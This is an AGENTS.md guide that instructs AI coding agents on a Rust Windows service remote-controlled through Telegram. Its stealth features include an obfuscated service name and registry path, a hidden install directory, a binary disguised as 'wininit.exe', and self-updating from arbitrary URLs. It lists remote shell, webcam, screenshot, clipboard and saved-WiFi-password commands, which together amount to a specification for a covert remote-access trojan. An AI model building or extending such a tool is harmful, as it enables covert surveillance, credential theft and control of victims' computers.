# AGENTS.md — Coding Agents Guide for tg-remote-bot

## Project Overview

A Windows remote-control agent that runs as a Windows Service and is controlled
via Telegram Bot API using long polling. One machine = one bot token. Super user
can send commands from any chat (DM, group).

- **Language:** Rust (edition 2024)
- **Target:** `x86_64-pc-windows-msvc` (Windows 10/11)
- **Runtime:** tokio (full features)
- **Bot framework:** teloxide 0.17 with macros
- **Logging:** fern + chrono — daily rotating file logs in `{home}/logs/`
- **Config:** DPAPI-encrypted registry (no .env, no baked token)
- **Error handling:** anyhow

## Build / Run / Test Commands

```powershell
# Build release
cargo build --release

# Build debug
cargo build

# Run in foreground (debug/test)
cargo run -- --run <TOKEN> <UID>

# Install as Windows Service (requires admin)
cargo run -- --install <TOKEN> <UID>

# Reinstall (update registry config)
cargo run -- --reinstall <TOKEN> <UID>

# Uninstall service
cargo run -- --uninstall

# Lint
cargo clippy --all-targets -- -D warnings

# Format
cargo fmt --all

# Format check
cargo fmt --all -- --check

# Run all tests
cargo test

# Run single test
cargo test test_name_here

# Check types
cargo check
```

## Code Style Guidelines

### Imports
- Group: `std` → external crates → `crate::` modules, blank line between groups.
- Prefer `use` over fully qualified paths.
- No glob imports except in test modules.

### Naming
- Modules: `snake_case` (e.g., `rate_limit.rs`)
- Types: `PascalCase` (e.g., `AgentState`, `RunningJob`)
- Functions/vars: `snake_case` (e.g., `is_authorized`, `truncate_str`)
- Constants: `SCREAMING_SNAKE_CASE` (e.g., `MUTEX_NAME`)
- Telegram commands: match command name (e.g., `fn screenshot()`, `fn sysinfo()`)

### Types & Patterns
- `anyhow::Result` for fallible functions.
- `Arc<Mutex<T>>` for shared mutable state (e.g., `ActiveJob`).
- `Mutex<HashMap<&str, Bucket>>` for rate limiting.
- Sensitive strings via `obfstr::obfstring!()` in `security/obfuscation.rs`.
- Config: CLI args or registry (DPAPI encrypted) — no .env or baked token.
- Uptime: stored as `Instant` in `AgentState.start_time`, computed via `start_time.elapsed()`.
- String truncation: use `bot::truncate_str()` which respects UTF-8 char boundaries.

### MarkdownV2
- All messages use `ParseMode::MarkdownV2` via `md::send()`.
- All dynamic content MUST be escaped via `md::escape()`.
- Static content must have `.` `,` `(` `)` `!` `+` `-` escaped with `\`.

### Formatting
- No `.rustfmt.toml` — use defaults (4-space indent, 100 char width).
- No comments unless explicitly asked.

### Error Handling
- Propagate with `?`; avoid `.unwrap()`.
- Use `.unwrap_or_else(|e| e.into_inner())` for mutex locks (handles poisoned mutex).
- Never panic in command handlers — return errors to user via Telegram.
- Use `anyhow::Context` for adding context: `.context("describing what failed")?`

### Async / Concurrency
- `tokio::spawn` for detached tasks; `JoinHandle` stored in `ActiveJob` for `/cancel`.
- Mutex lock must NOT be held across `.await` — extract value first, drop guard, then await.
- Shell output truncated at 3800 bytes via `truncate_str()`.
- Read stdout/stderr concurrently via separate `tokio::spawn` tasks to avoid pipe deadlock.

### Session Management (machine/session.rs)
- `run_in_user_session(exe, args, wait_ms)` — spawns process as active user via `CreateProcessAsUserW`.
- `capture_in_user_session(exe, args, wait_ms)` — same but captures stdout via pipe.
- `is_system_session()` — returns `true` when no active console session (`WTSGetActiveConsoleSessionId() == u32::MAX`).
- Function signatures take `Vec<String>` for args (owned, required for `spawn_blocking` `'static` bound).

### Project Structure
```
src/
├── main.rs           # CLI args, mutex check, admin check, SCM dispatch
├── bot/
│   ├── mod.rs        # AgentState, run_until(cfg) with retry loop, truncate_str()
│   ├── auth.rs       # is_authorized()
│   ├── md.rs         # MarkdownV2 escape(), send(), send_photo()
│   ├── router.rs     # Command enum, handler functions, ensure_authorized()
│   └── rate_limit.rs # Token bucket per-command rate limiter
├── commands/
│   ├── ping.rs       # PONG + IP + uptime + version
│   ├── status.rs     # PID + uptime + job status
│   ├── screenshot.rs # Screen capture → JPEG
│   ├── shell.rs      # cmd /C execution + /cancel (concurrent stdout/stderr read)
│   ├── sysinfo.rs    # CPU, RAM, disks, network (saturating_sub for disk calc)
│   ├── system.rs     # lock, shutdown, restart, abort, run (shared run_shutdown_cmd)
│   ├── files.rs      # listfiles, getfile
│   ├── procs.rs      # procs, kill
│   ├── network.rs    # netstat (interface list)
│   ├── clipboard.rs  # Read clipboard
│   ├── location.rs   # IP geolocation (HTTPS, formatted JSON response)
│   ├── camera.rs     # Webcam capture
│   ├── wallpaper.rs  # Get desktop wallpaper
│   ├── wifi.rs       # Saved WiFi profiles + passwords (split_once for parsing)
│   ├── audio.rs      # mute, unmute, volume (run_powershell helper)
│   ├── msgbox.rs     # MessageBox Win32 (blocking)
│   └── notify.rs     # Login watcher (stub)
├── machine/
│   ├── mod.rs
│   ├── identity.rs   # SHA256(hostname+MAC) machine ID (unused currently)
│   └── session.rs    # User session process spawning (CreateProcessAsUserW)
├── security/
│   ├── mod.rs
│   ├── dpapi.rs      # CryptProtectData / CryptUnprotectData
│   └── obfuscation.rs # obfstr! for service name, registry path, install_home
├── service/
│   ├── mod.rs
│   ├── config.rs     # Registry-only config (DPAPI encrypted)
│   ├── install.rs    # SCM install/uninstall + setup_home_dir() + cleanup_old_files()
│   ├── logging.rs    # DailyFile writer + init_logger()
│   └── windows_svc.rs # define_windows_service! + SCM dispatch, auto-update on start
└── updater/
    ├── mod.rs
    └── self_update.rs # check_remote_version, download, apply_update, auto_update
```

### Self-Update System
- **Auto-update:** On service start, fetches GitHub Releases API, compares `tag_name` with `CARGO_PKG_VERSION`. If different → downloads `wininit.exe` → stops service → swaps binary → starts service → exits.
- **Manual `/update <url>`:** Downloads binary from user-provided URL, swaps, restarts.
- **`/update` (no args):** Auto-checks GitHub for new version, downloads if available.
- **Flow:** `check_remote_version()` → `find_asset_url()` → `download_file()` → `apply_update()`
- **Swap order:** stop service → rename exe to .old → copy new → start service → `process::exit(0)`
- **Cleanup:** `.old` files deleted on next startup via `cleanup_old_files()` in `service::install`.
- **GitHub Release:** Binary must be named `wininit.exe` as release asset.
- **CI/CD:** `.github/workflows/release.yml` — triggers on `v*` tag push, builds, creates release with `wininit.exe`.

### Win32 API Notes
- `LockWorkStation` is in `windows_sys::Win32::System::Shutdown` (not `UI::WindowsAndMessaging`).
- `DuplicateTokenEx` is in `windows_sys::Win32::Security` (not `System::Threading`).
- `CreatePipe` parameter `sa` does not need `mut`.

### Mandatory Rules
1. Only one instance per machine — enforced via named mutex (`CreateMutexA`).
2. `--install` requires admin — checked via HKLM write access.
3. Polling retry with exponential backoff on `TerminatedByOtherGetUpdates`.
4. All commands reply to the specific message via `reply_parameters`.
5. `AgentState` includes `agent_version = env!("CARGO_PKG_VERSION")` and `start_time: Instant`.
6. No topic/group constraints — super user can command from anywhere.
7. Install creates hidden home dir in `%ProgramData%`, copies exe, then registers service.
8. Log files in `{home}/logs/agent_YYYY-MM-DD.log`, daily rotation via `DailyFile` writer.
9. Config via CLI args (`--run TOKEN UID`, `--install TOKEN UID`) — no .env, no baked token.
10. `run_until()` takes `AppConfig` as parameter; service mode loads from registry.
11. Auth check uses `ensure_authorized()` helper in `router.rs` — do not duplicate auth logic.
12. All commands that could be abused have rate limits in `rate_limit.rs`.
